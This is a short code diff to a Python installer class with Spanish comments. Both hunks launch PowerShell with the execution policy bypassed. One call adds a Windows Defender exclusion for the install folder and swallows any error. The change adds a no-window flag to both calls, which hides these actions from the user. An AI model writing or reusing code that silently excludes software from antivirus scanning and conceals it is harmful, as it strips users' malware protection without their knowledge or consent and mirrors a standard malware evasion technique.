@@ -173,7 +173,8 @@ class InstallerApp:
                 subprocess.run(
                     ["powershell", "-ExecutionPolicy", "Bypass", "-Command",
                      f"Add-MpPreference -ExclusionPath '{dest}'"],
-                    capture_output=True, timeout=15)
+                    capture_output=True, timeout=15,
+                    creationflags=subprocess.CREATE_NO_WINDOW)
             except Exception:
                 pass  # No crítico — continuar instalación de todas formas
 
@@ -198,7 +199,7 @@ class InstallerApp:
         )
         subprocess.run(
             ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps],
-            capture_output=True)
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
     # ── Pantallas de resultado ────────────────────────────────────────────────
     def _done(self, dest: Path, version: str):
